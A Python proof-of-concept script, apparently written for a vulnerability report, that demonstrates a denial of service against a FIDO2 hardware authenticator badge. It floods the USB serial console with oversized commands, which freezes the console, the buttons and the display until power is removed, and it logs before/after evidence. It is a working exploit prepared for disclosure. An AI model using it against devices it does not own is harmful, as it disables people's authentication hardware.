#!/usr/bin/env python3
"""
f9_demo.py -- demonstrate finding F-1 with before/after evidence. Nothing else.

This deliberately uses NO supported display API. It does not upload an image, does not
draw anything, and does not touch the badge's UI. The only thing it does is send console
traffic and record what the device does in response.

That restraint is the point. A demo that puts chosen text on the screen via the `image`
command proves nothing about security -- it is the vendor's own documented feature. This
proves one thing, and it is a real one:

    A few seconds of unauthenticated USB traffic freezes the console, the physical
    buttons and the display of a FIDO2 hardware authenticator, and only removing power
    brings it back.

WHAT IT DOES
    1. records that the console is alive and answering
    2. sends the measured trigger: 20 commands x 1000 characters at 0.35 s spacing
    3. records that the console has stopped answering
    4. prompts you to check the physical buttons and the screen, and writes down what
       you observed

Everything goes into a transcript you can attach to a report.

RECOVERY
    Remove power. With no battery fitted, unplug USB for 3 seconds. Unplugging is not
    enough if a battery is installed -- pull a cell.

USAGE
    python f9_demo.py --port COM5
    python f9_demo.py --port COM5 --log evidence.txt
"""

import argparse
import sys
import time

import serial


def probe(ser):
    """Send `ver` and return whatever comes back.

    A bare newline goes first: physical button presses land in the same input line as
    serial characters (usb-bao1x/src/main.rs:605), so anything pressed since the last
    command is still buffered and would corrupt the verb.
    """
    try:
        ser.reset_input_buffer()
        ser.write(b"\r\n")
        ser.flush()
        time.sleep(0.4)
        ser.reset_input_buffer()
        ser.write(b"ver\r\n")
        ser.flush()
    except Exception as e:
        return f"<write failed: {type(e).__name__}: {e}>"
    time.sleep(1.2)
    try:
        return ser.read(16384).decode("utf8", "replace")
    except Exception as e:
        return f"<read failed: {type(e).__name__}: {e}>"


def alive(reply: str) -> bool:
    low = reply.lower()
    return any(m in low for m in ("xous", "[console]", "commands:"))


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default="COM5")
    ap.add_argument("--count", type=int, default=20, help="commands in the burst")
    ap.add_argument("--size", type=int, default=1000, help="characters per command")
    ap.add_argument("--gap", type=float, default=0.35, help="seconds between commands")
    ap.add_argument("--log", default="f9_evidence.txt")
    a = ap.parse_args()

    lines = []

    def say(s=""):
        print(s)
        lines.append(s)

    say("F-1 demonstration -- full device denial of service")
    say(f"port {a.port}   {time.strftime('%Y-%m-%d %H:%M:%S')}")
    say()
    say("This sends console traffic only. No image is uploaded, no UI is touched,")
    say("no supported display API is used. Whatever the screen does is the badge's")
    say("own reaction.")
    say()

    try:
        ser = serial.Serial(a.port, 115200, timeout=0.3, write_timeout=3.0)
    except Exception as e:
        say(f"cannot open {a.port}: {e}")
        return 1
    time.sleep(0.5)

    # ---- before -------------------------------------------------------------
    say("[1] BEFORE")
    before = probe(ser)
    say(f"    console reply: {before.strip()[:160]!r}")
    if not alive(before):
        say()
        say("    Console is already unresponsive. Power-cycle the badge first:")
        say("    unplug USB for 3 s (or pull a cell if a battery is fitted), then re-run.")
        ser.close()
        with open(a.log, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        return 1
    say("    -> console ALIVE")
    say()
    say("    Look at the badge now. Press its buttons -- the screen should react.")
    try:
        input("    Press Enter here once you have confirmed that... ")
    except EOFError:
        pass
    say()

    # ---- trigger ------------------------------------------------------------
    total = a.count * a.size
    rate = a.size / a.gap if a.gap else float("inf")
    say("[2] TRIGGER")
    say(f"    {a.count} commands x {a.size} chars, {a.gap}s apart")
    say(f"    = {total} characters over ~{a.count * a.gap:.1f}s  (~{rate:.0f} chars/s)")
    say()
    say("    Mechanism: every CDC byte is replayed as one blocking, unwrapped IPC")
    say("    (usb-bao1x/src/main.rs:605 -> keyboard/src/lib.rs:106), inside the USB")
    say("    service's own message loop. Physical button events use try_send_message")
    say("    and are DROPPED when that queue is full, so the attacker's keystrokes")
    say("    starve the device's own buttons.")
    say()

    sent = 0
    try:
        for i in range(a.count):
            ser.write(b"image " + b"A" * a.size + b"\r\n")
            ser.flush()
            sent += 1
            if a.gap:
                time.sleep(a.gap)
    except Exception as e:
        say(f"    write failed after {sent} commands: {type(e).__name__}: {e}")
        say("    (USB OUT endpoint stopped being drained -- already wedged)")
    say(f"    sent {sent}/{a.count} commands")
    say()
    time.sleep(2.0)

    # ---- after --------------------------------------------------------------
    say("[3] AFTER")
    after = probe(ser)
    say(f"    console reply: {after.strip()[:160]!r}" if after.strip()
        else "    console reply: <nothing>")
    still = alive(after)
    say(f"    -> console {'STILL ALIVE (not reproduced this run)' if still else 'DEAD'}")
    ser.close()
    say()

    if not still:
        say("[4] OBSERVE THE DEVICE")
        say("    Check, and be precise -- this is what the severity turns on:")
        say("      a. do the physical buttons change the screen?")
        say("      b. is the display frozen on whatever it last showed?")
        try:
            btn = input("    Do the buttons still work? (y/n): ").strip().lower()
            scr = input("    Is the screen frozen? (y/n): ").strip().lower()
        except EOFError:
            btn = scr = "?"
        say(f"    buttons responsive: {btn}")
        say(f"    screen frozen:      {scr}")
        say()
        if btn.startswith("n") and scr.startswith("y"):
            say("    RESULT: full device denial of service.")
            say("    Unauthenticated USB traffic, no bootloader, no k0, a few seconds.")
            say("    Recovery requires removing power.")
        else:
            say("    RESULT: console-only denial of service on this run.")
        say()
        say("    Recover: unplug USB for 3 s (pull a cell if a battery is fitted).")

    with open(a.log, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print(f"\nevidence written to {a.log}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
